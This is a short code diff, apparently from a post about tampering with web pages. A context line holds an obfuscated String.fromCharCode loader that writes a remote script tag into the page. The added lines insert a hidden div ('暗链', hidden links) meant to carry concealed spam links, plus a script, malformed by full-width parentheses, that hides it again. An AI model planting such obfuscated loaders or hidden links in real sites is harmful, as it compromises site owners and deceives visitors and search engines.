@@ -13,4 +13,13 @@ var x2b = String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,104,116
 document.write(x2b);
 </script>
 
+<!--暗链-->
+<div style="display:none;">
+<div id="urls">
+<!--HML<a标签的地址>-->
+
+</div>
+</div>
+<script>document.getElementById（"urls"）.style.display="none"</script>
+
 ```
